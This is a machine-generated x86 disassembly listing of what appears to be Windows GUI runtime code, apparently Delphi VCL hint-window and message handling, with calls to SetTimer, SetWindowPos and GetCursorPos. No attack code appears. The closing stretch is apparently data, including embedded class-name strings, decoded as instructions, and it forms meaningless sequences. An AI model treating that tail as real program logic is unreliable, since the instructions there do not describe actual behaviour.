lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_466c88
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_445c58
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_468e10
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403758
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4691a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_468b74
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420574
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468d67
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_468d70
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_466104
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4660f0
movzx edx di
xor ecx ecx
call sub_449ca8
inc esi
dec ebx
jne r-xdata
sub_468dac
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_467ec8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_467ec8
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_468d70
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_468e10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404414
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_40405c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4426f8
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455598
xor eax eax
push ebp
push sub_468e95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_468ea4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_468f00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_466104
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_468ea4
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4660f0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_468ea4
pop ecx
jmp r-xdata
mov eax ebx
call sub_44f5e0
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call IsChild
test eax eax
jne r-xdata
sub_468f88
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405874
call sub_42a42c
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_468fb0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_468ff4
push sub_466ce0
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4691a8
sub_46901c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b4c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44860c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_4473a0
call sub_466cc0
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4691a8
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b4c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44860c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4691a8
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_468fb0
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_449ca8
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_469440
jmp r-xdata
sub_46912c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_468ff4
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_469440
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_469164
jmp r-xdata
sub_469164
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_44f2dc
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_44f2dc
push eax
call ShowWindow
sub_4691a8
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_469164
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_466e48
mov eax ebx
call sub_468ff4
sub_4691e0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_469322
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_425b30
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407cc4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4692f3
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_425be8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4692fa
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4691d0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4691d0
mov [ ebp - 0x4 ] eax
sub_4692fa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_469334
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403290
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031d8
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_469394
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46942e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469435
lea eax [ ebp - 0x8 ]
call sub_404008
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_424714
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c374
mov ebx eax
inc ebx
sub_469440
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404974
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4697c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4691a8
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_468fb0
jmp r-xdata
call sub_45f670
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4697cd
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a38
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_4473a0
call sub_466cc0
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_4691e0
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_466084
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448494
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448638
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_466c88
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_445c14
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4040a0
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_449ca8
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_469334
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44860c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44860c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_448c94
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_466dd4
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_469394
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_468fb0
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_468fb0
jmp r-xdata
sub_4697d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_40405c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_469810
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_449ca8
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_449ca8
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_455460
sub_4698a0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4698c8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46996c
add [ eax ] eax
add [ eax ] al
jo r-xdata
cmp [ eax - 0x7140007 ] ah
pop ebp
retn
inc edi
add [ eax ] bl
push edx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4699cf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_45f41c
mov eax sub_45f69c
call sub_417cb8
mov eax [ rw-data ]
push eax
call CloseHandle
sub_469b83
test eax 0xa7940046
inc esi
add [ eax + esi * 4 - 0x5057ffba ] ch
inc esi
add [ eax - 0x7ffb951 ] dh
scasd [ edi ]
inc esi
add [ edi + ebp * 4 ] al
inc esi
add [ ebp + ebp * 4 + 0x46 ] dh
add [ eax + 0x240046ad ] ah
mov al 0x46
add [ eax - 0x50 ] ch
inc esi
add ah ah
scasb [ edi ]
inc esi
add [ 0x65684354 ] cl
arpl [ ebx + 0x4c ] bp
imul esi [ ebx + 0x74 ] 0xc4786f42
fwait
inc esi
add [ edi ] al
or eax 0x65684354
arpl [ ebx + 0x4c ] bp
imul esi [ ebx + 0x74 ] 0x68786f42
0xcfbc0046 0x43
dec ebx
add [ eax ] cl
inc ebx
push 0x4c6b6365
jae r-xdata
add [ eax ] al
dec [ eax + 0x7e ]
inc esp
add ah ah
jle r-xdata
inc eax
add [ esi + edx * 2 ] dl
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c000c ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x63656843
imul eax eax 0x34
inc esp
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x6c410500
imul esp [ edi + 0x6e ] r-xdata
add [ edx ] 0x0
inc [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc ecx
insb
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsd
insd
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax + eax ] dl
insb
inc ebp
jae r-xdata
inc esp
add [ ecx + eax ] ah
push eax
inc [ eax + eax + 0x1 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
or al 0x41
jne r-xdata
insb
dec edi
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
jns r-xdata
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x84ff0001
insb
outsd
ja r-xdata
dec edx
inc esp
add [ ebx + 0x1 ] ah
add bh bh
[ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4865646f
fild [ ebp ]
and al 0x2
jne r-xdata
outsd
inc ebx
add bh bh
sub [ eax ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
inc edx
jbe r-xdata
adc al 0x4b
inc esp
add [ edx + 0x1 ] ah
add bh bh
xor al 0x0
inc edx
jbe r-xdata
hlt
inc ebx
jb r-xdata
add bh bh
sbb [ eax ] al
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
adc eax 0x65420a00
jbe r-xdata
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
add [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ edx + 0x65 ] eax
jbe r-xdata
dec ebx
inc esp
add [ ebp + 0x1 ] ah
add bh bh
add [ fs : ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x0
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001a ] al
je r-xdata
adc [ eax ] al
sub al 0x2
add bh bh
xchg esp eax
adc eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebx
outsd
insb
jne r-xdata
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
dec edx
inc esi
dec ebp
outsd
add [ gs : eax ] dl
sbb eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x1cff0001 ] ah
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001b ] al
je r-xdata
add eax 0x6f6c6f43
jb r-xdata
insb
pushad
sbb eax r--data
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0x18ff0000 ] 0x0
inc esp
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
sbb eax 0x2940042
add bh bh
sub [ ecx + 0x10046 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0xffffe9 ] al
and al [ eax ]
or ecx [ eax + 0x65 ]
popad
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + ebp * 4 + 0x34 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
add al [ eax ]
[ eax ]
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
outsd
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070025 ] al
insd
sbb eax 0x2980042
add bh bh
adc al 0xb1
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] 0x0
add bh bh
and eax [ eax ]
adc eax 0x64616548
jb r-xdata
[ eax + 0x10046b0 ]
jae r-xdata
dec esi
popad
insd
add [ gs : eax ] dl
inc eax
add [ ecx ] bh
add al [ eax ]
jmp [ eax + 0x1004414 ]
add [ eax - 0x80000000 ] al
and eax 0x6d490700
popad
